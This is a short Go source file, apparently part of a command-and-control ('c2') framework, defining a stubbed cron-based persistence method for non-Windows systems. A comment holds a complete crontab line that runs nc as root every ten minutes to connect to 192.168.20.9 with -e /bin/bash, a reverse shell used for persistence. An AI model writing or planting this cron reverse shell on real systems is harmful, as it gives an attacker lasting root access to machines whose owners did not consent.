//+build !windows

package c2

// cron runner
//*/10 * * * * root nc 192.168.20.9 12345 -e /bin/bash

type Cron struct{}

func (c *Cron) Persist() error{
  return nil
}
